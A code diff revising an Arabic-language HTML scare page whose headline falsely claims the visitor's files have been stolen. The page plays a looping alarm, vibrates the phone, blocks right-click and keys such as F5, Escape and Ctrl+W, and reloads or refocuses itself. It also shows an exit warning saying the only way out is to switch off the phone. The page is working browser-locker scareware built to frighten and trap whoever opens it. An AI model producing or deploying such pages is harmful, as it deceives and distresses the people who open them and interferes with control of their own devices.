@@ -3,148 +3,140 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>تم سرقت ملفاتك⚠️🚫</title>
+<title>تم سرقة ملفاتك⚠️🚫</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
-
+  /* خلفية سوداء مع خطوط رفيعة خضراء متحركة */
   body {
     margin: 0;
     height: 100vh;
     background: black;
     overflow: hidden;
-    font-family: 'Orbitron', monospace;
+    font-family: Arial, sans-serif;
     user-select: none;
-    color: #0f0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    color: #00ff00;
   }
-
-  /* خطوط رفيعة خضراء متحركة */
-  body::before {
-    content: '';
+  .matrix-lines {
     position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
+    top: 0; left: 0; right: 0; bottom: 0;
+    pointer-events: none;
     background:
       repeating-linear-gradient(
         0deg,
         transparent,
         transparent 1px,
-        #0f0 2px,
-        transparent 3px
-      ),
-      repeating-linear-gradient(
-        90deg,
-        transparent,
-        transparent 1px,
-        #0f0 2px,
-        transparent 3px
+        #0f0 1.5px,
+        #0f0 2px
       );
-    animation: gridMove 10s linear infinite;
-    z-index: 0;
+    animation: linesMove 3s linear infinite;
+    z-index: 1;
   }
-
-  @keyframes gridMove {
-    0% {background-position: 0 0, 0 0;}
-    100% {background-position: 100px 100px, 100px 100px;}
+  @keyframes linesMove {
+    0% { background-position: 0 0; }
+    100% { background-position: 0 100px; }
   }
-
   h1 {
-    position: absolute;
-    top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
+    position: relative;
     font-size: 5em;
-    text-align: center;
-    color: #0f0;
+    z-index: 10;
     text-shadow:
       0 0 5px #0f0,
       0 0 10px #0f0,
-      0 0 20px #00ff00,
-      0 0 30px #00ff00,
-      0 0 40px #00ff00,
-      0 0 55px #00ff00,
-      0 0 75px #00ff00;
-    animation: glitch 2s infinite;
-    z-index: 10;
+      0 0 20px #0f0,
+      0 0 40px #0f0;
+    animation: glitch 1.5s infinite;
   }
-
-  /* تأثير التشويش */
   @keyframes glitch {
     0% {
       clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%);
       transform: translate(2px, -2px);
+      text-shadow: 0 0 10px #0f0;
     }
     20% {
       clip-path: polygon(0 15%, 100% 15%, 100% 18%, 0 18%);
       transform: translate(-2px, 2px);
+      text-shadow: 0 0 15px #00ff00;
     }
     40% {
       clip-path: polygon(0 35%, 100% 35%, 100% 38%, 0 38%);
       transform: translate(2px, 0);
+      text-shadow: 0 0 20px #00ff00;
     }
     60% {
       clip-path: polygon(0 55%, 100% 55%, 100% 58%, 0 58%);
       transform: translate(-2px, 0);
+      text-shadow: 0 0 25px #00ff00;
     }
     80% {
       clip-path: polygon(0 75%, 100% 75%, 100% 78%, 0 78%);
       transform: translate(0, 2px);
+      text-shadow: 0 0 30px #0f0;
     }
     100% {
       clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%);
       transform: translate(2px, -2px);
+      text-shadow: 0 0 10px #0f0;
     }
   }
 </style>
 </head>
 <body>
 
+<div class="matrix-lines"></div>
 <h1>تم سرقت ملفاتك⚠️🚫</h1>
 
 <audio id="alarm" autoplay loop>
   <source src="https://actions.google.com/sounds/v1/alarms/bugle_tune.ogg" type="audio/ogg" />
   <source src="https://actions.google.com/sounds/v1/alarms/bugle_tune.mp3" type="audio/mpeg" />
+  متصفحك لا يدعم تشغيل الصوت التلقائي.
 </audio>
 
 <script>
-  // منع النقر يمين
-  window.addEventListener("contextmenu", e => e.preventDefault());
+  // منع الخروج من الصفحة بأي طريقة سهلة
+  window.addEventListener("keydown", function(e) {
+    // منع مفاتيح الإعادة للخلف، تحديث، فتح أدوات المطور
+    const forbiddenKeys = ["F5", "Backspace", "Escape", "ArrowLeft", "ArrowRight"];
+    if (forbiddenKeys.includes(e.key) || (e.ctrlKey && ["r", "R", "w", "W", "c", "C", "u", "U", "Shift"].includes(e.key))) {
+      e.preventDefault();
+      e.stopPropagation();
+    }
+  }, true);
 
-  // منع المفاتيح (مثل F5، Ctrl+W، Alt+F4...)  
-  window.addEventListener("keydown", e => {
+  // منع النقر بالزر الأيمن
+  window.addEventListener("contextmenu", function(e) {
     e.preventDefault();
   });
 
-  // اهتزاز الهاتف كل ثانية (إذا مدعوم)
+  // اهتزاز الهاتف بالتزامن مع الصوت
   function vibrate() {
     if (navigator.vibrate) {
-      navigator.vibrate(500);
+      navigator.vibrate([500, 200, 500]); // اهتزاز متقطع
     }
   }
-  setInterval(vibrate, 1000);
 
-  // تحذير عند محاولة الخروج + إعادة تحميل تلقائية
-  window.addEventListener('beforeunload', function (e) {
-    e.preventDefault();
-    e.returnValue = '';
-    setTimeout(() => {
-      window.location.reload();
-    }, 100);
-    return '';
+  // تكرار الاهتزاز مع الصوت
+  setInterval(vibrate, 1500);
+
+  // محاولة منع الخروج عبر علامات التبويب أو إغلاق الصفحة
+  window.onbeforeunload = function() {
+    return "لا يمكنك الخروج إلا بإطفاء الهاتف وإعادة تشغيله!";
+  };
+
+  // محاولة إعادة التركيز على الصفحة فور الخروج (محدودة)
+  window.addEventListener("blur", () => {
+    setTimeout(() => window.focus(), 0);
   });
 
-  // منع الخروج عبر محاولات تغيير الصفحة
-  window.addEventListener('visibilitychange', () => {
-    if (document.visibilityState === 'hidden') {
-      window.location.reload();
-    }
-  });
-
-  // السماح بالخروج فقط عند انقطاع الإنترنت (غريبة ورعب إضافي)
-  function checkConnection() {
+  // عند فقدان الاتصال حاول إعادة تحميل الصفحة
+  setInterval(() => {
     if (!navigator.onLine) {
-      window.location.href = "about:blank";
+      location.reload();
     }
-  }
-  setInterval(checkConnection, 1000);
+  }, 1000);
+
 </script>
 
 </body>
